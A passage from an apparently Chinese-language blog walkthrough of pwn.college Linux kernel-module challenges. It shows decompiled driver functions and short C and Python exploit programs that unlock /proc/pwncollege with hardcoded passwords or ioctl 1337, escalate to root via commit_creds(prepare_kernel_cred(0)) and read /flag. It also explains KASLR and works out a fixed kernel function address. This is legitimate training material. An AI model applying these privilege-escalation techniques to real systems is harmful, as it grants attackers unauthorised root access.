printk(&amp;unk_940);</span><br><span class="line">    size = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">        size = length;</span><br><span class="line">    copy_from_user(password, buffer, size);</span><br><span class="line">    device_state[<span class="number">0</span>] = (<span class="built_in">strncmp</span>(password, <span class="string">&quot;euxscnoiramxamcf&quot;</span>, <span class="number">0x10u</span>) == <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数没有太多的疑问，但是 <code>strncmp(password, &quot;euxscnoiramxamcf&quot;, 0x10u) == 0</code>可以控制 device_state 的值，假如 strncmp &#x3D; 0，则值为 1；若 !&#x3D;0，则值为 2；</p>
+<h5 id="device-read-："><a href="#device-read-：" class="headerlink" title="device_read()："></a>device_read()：</h5><ul>
+<li><code>device_write</code>是用户态向内核写入数据的函数。重点看它如何处理 <code>_copy_from_user</code> 读进来的数据。</li>
+<li>是否没有校验用户传入的长度，直接拷贝到内核栈&#x2F;堆（导致内核栈溢出或堆溢出）。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_read</span><span class="params">(file *file, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *p_invalid_password_n; <span class="comment">// rsi</span></span><br><span class="line">    <span class="type">size_t</span> length_1; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// kr08_8</span></span><br><span class="line"></span><br><span class="line">    printk(&amp;unk_980);</span><br><span class="line">    p_invalid_password_n = flag;</span><br><span class="line">    <span class="keyword">if</span> ( device_state[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        p_invalid_password_n = <span class="string">&quot;device error: unknown state\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( device_state[<span class="number">0</span>] &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            p_invalid_password_n = <span class="string">&quot;password:\n&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( device_state[<span class="number">0</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                p_invalid_password_n = <span class="string">&quot;device error: unknown state\n&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( device_state[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    device_state[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    p_invalid_password_n = <span class="string">&quot;invalid password\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    length_1 = length;</span><br><span class="line">    v8 = <span class="built_in">strlen</span>(p_invalid_password_n) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 - <span class="number">1</span> &lt;= length )</span><br><span class="line">        length_1 = v8 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v8 - <span class="number">1</span> - copy_to_user(buffer, p_invalid_password_n, length_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然我们是需要让 device_state[0]&#x3D;2 的</p>
+<p>最后利用 <code>copy_to_user</code> 将 <code>p_invalid_password_n</code> 指向的字符串，拷贝到你用户态的 <code>buffer</code> 中。  </p>
+<h5 id="device-open-device-realease"><a href="#device-open-device-realease" class="headerlink" title="device_open&amp;device_realease"></a>device_open&amp;device_realease</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">device_open</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_918);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">device_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_8F0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没什么用处，都是打印内容，可跳过。</p>
+<h4 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h4><p>此时程序分析清楚大概也就知道 EXP 思路了，令 device_state[0] &#x3D; 2 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *password = <span class="string">&quot;euxscnoiramxamcf&quot;</span>;</span><br><span class="line">    <span class="type">ssize_t</span> written;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH,O_WRONLY);</span><br><span class="line">    written = write(fd, password, <span class="built_in">strlen</span>(password));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write successfully!\n&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在 <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> 当中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXIT_SUCCESS 0  </span></span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;  表示异常退出，通常等价于非 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781166719180-15abf856-6f34-437f-bb39-1708008325eb.png"></p>
+<p>vm connect 启动环境，将写的 exp 复制到远程环境当中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /home/kali/Desktop/kali_share/pwn_college/exp1 hacker@dojo.pwn.college:~/</span><br></pre></td></tr></table></figure>
+
+<p>执行 .&#x2F;exp1 获取 flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169271732-13e71a2d-4a9d-4ee4-8d28-c60be277e7ec.png"></p>
+<p>还看到有的师傅使用 python 解决：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/pwncollege&quot;</span>, <span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&quot;snceewqvyntlwfha&quot;</span>)</span><br><span class="line">    data = f.read(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="LEVEL2-内核日志"><a href="#LEVEL2-内核日志" class="headerlink" title="LEVEL2_内核日志"></a>LEVEL2_内核日志</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169537200-f018653a-c918-496c-8513-a5ce4765471f.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169641545-37021443-8231-4601-af33-e5749b0a7157.png"></p>
+<p>这道题目没有 device_read ，其中在 device_write 会把内容输出到内核日志当中 &#x3D;&#x3D;&gt; printk</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> n16; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">    printk(&amp;unk_518);</span><br><span class="line">    n16 = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">        n16 = length;</span><br><span class="line">    copy_from_user(password, buffer, n16);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;seywmafciuspxdbd&quot;</span>, <span class="number">0x10u</span>) )</span><br><span class="line">        printk(&amp;unk_6F8);</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781171046074-a0042e5e-e790-477b-9a05-befa710b4a94.png"></p>
+<p>除此之外，其他内容和 LEVEL1 都相同，那我们用相同的脚本，password 改一下，然后去读取日志即可：</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *password = <span class="string">&quot;seywmafciuspxdbdf&quot;</span>;</span><br><span class="line">    <span class="type">ssize_t</span> written;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH,O_WRONLY);</span><br><span class="line">    written = write(fd, password, <span class="built_in">strlen</span>(password));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write successfully!\n&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行 exp 之后查看日志，得到flag：<code>dmesg | tail -n 20</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781171917734-11483cb2-5a64-4e4c-bc97-1027b6184ef6.png"></p>
+<h3 id="LEVEL3-提权函数"><a href="#LEVEL3-提权函数" class="headerlink" title="LEVEL3_提权函数"></a>LEVEL3_提权函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    printk(&amp;unk_598);</span><br><span class="line">    v0 = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">    commit_creds(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> n16; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">    printk(&amp;unk_5D8);</span><br><span class="line">    n16 = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">        n16 = length;</span><br><span class="line">    copy_from_user(password, buffer, n16);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;palsvdypuvlabqre&quot;</span>, <span class="number">0x10u</span>) )</span><br><span class="line">        win();</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和 LEVEL1&amp;2 一样，不同的是多了提权函数 win：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">commit_creds(v0);</span><br></pre></td></tr></table></figure>
+
+<h5 id="提权核心凭证：commit-creds-prepare-kernel-cred-0"><a href="#提权核心凭证：commit-creds-prepare-kernel-cred-0" class="headerlink" title="提权核心凭证：commit_creds(prepare_kernel_cred(0))"></a>提权核心凭证：<code>commit_creds(prepare_kernel_cred(0))</code></h5><p>Linux 内核用一个叫 <code>cred</code> 的结构体来记录每个进程的权限（比如用户的 UID、GID 等）。</p>
+<p>普通用户的 UID 通常是大于 1000 的，而超级用户（Root）的 UID 是 <code>0</code>。</p>
+<ul>
+<li><code>prepare_kernel_cred(0)</code>：这个内核函数的作用是创建一个新的凭证结构体。当我们传入参数 <code>0</code>（也就是 NULL）时，内核会默认以内核 root 的身份作为模板，生成一套 UID&#x3D;0、GID&#x3D;0 的最高权限凭证。</li>
+<li><code>commit_creds(v0)</code>：这个函数的作用是把刚刚生成的凭证，正式应用到当前正在运行的进程上。</li>
+</ul>
+<p>exp 的思路是一样的，只是获取 flag 的方式不同了，主要是让理解提权函数的一关。</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *password = <span class="string">&quot;palsvdypuvlabqre&quot;</span>;</span><br><span class="line">    <span class="type">ssize_t</span> written;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH,O_WRONLY);</span><br><span class="line">    written = write(fd, password, <span class="built_in">strlen</span>(password));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write successfully!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781173562050-274283a6-191e-4e6b-a17d-19b215cc413d.png"></p>
+<h3 id="LEVEL4-iotcl"><a href="#LEVEL4-iotcl" class="headerlink" title="LEVEL4_iotcl"></a>LEVEL4_iotcl</h3><p><code>ioctl</code> 是 <strong>Input&#x2F;Output Control（输入&#x2F;输出控制）</strong> 的缩写。它是 Linux 和 Unix 系统中一个非常强大且通用的系统调用（System Call）。</p>
+<ul>
+<li>ioctl 就像是发送控制指令。当你除了传输数据外，还想让驱动程序执行某些特定操作、调整设备状态、或者执行某个特定函数时，就会使用 ioctl。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">    <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v7 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">    printk(&amp;unk_D78);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        copy_from_user(password, arg, <span class="number">16</span>);</span><br><span class="line">        v5 = <span class="built_in">strncmp</span>(password, <span class="string">&quot;hacvtgrjhlscihpk&quot;</span>, <span class="number">0x10u</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">            win();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 1337</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *password = <span class="string">&quot;hacvtgrjhlscihpk&quot;</span>;</span><br><span class="line">    <span class="type">ssize_t</span> written;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH, O_WRONLY);</span><br><span class="line">    written = ioctl(fd, CMD, password);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;successfully&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781175597803-2d0eb64d-b65b-40b6-b68c-9964831ca794.png"></p>
+<h3 id="LEVEL5-参数指针调用"><a href="#LEVEL5-参数指针调用" class="headerlink" title="LEVEL5_参数指针调用"></a>LEVEL5_参数指针调用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    printk(&amp;byte_1118);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, file *))arg)(&amp;byte_1118, file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    printk(&amp;unk_1148);</span><br><span class="line">    v0 = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">    commit_creds(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当 cmd 命令号为 1337 时，会调用传入的参数 arg，允许任意内核函数执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cmdline    <span class="comment"># 查看当前内核的启动命令行配置</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781176879854-3015ca32-8445-4369-9c77-302c44e3a1b8.png"></p>
+<p>未开启内核基地址随机化</p>
+<ul>
+<li><code>kaslr</code>：如果存在，说明开启了内核地址空间布局随机化（Kernel ASLR），每次重启内核基地址都会变</li>
+<li><code>nokaslr</code>，关闭了随机化，内核基地址是固定的。</li>
+<li><code>pti=on</code> 或 <code>kpti</code>：说明开启了内核页表隔离 Kernel Page Table Isolation，用于防御熔断Meltdown 漏洞，会极大地限制内核与用户态页表的共享。</li>
+<li><code>quiet</code> &#x2F; <code>loglevel</code>：决定了内核日志输出的详细程度。</li>
+</ul>
+<h5 id="内核模块基地址-Module-Base）：0xffffffffc0000000"><a href="#内核模块基地址-Module-Base）：0xffffffffc0000000" class="headerlink" title="内核模块基地址 Module_Base）：0xffffffffc0000000"></a>内核模块基地址 Module_Base）：<code>0xffffffffc0000000</code></h5><p>这是 Linux 动态加载模块（LKM，Linux Kernel Modules）的固定起始地址。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781177719766-9f9479ac-e71f-469f-b580-dc68817724aa.png"></p>
+<p>那么 win 函数的地址就应该是 0xffffffffc00010AD</p>
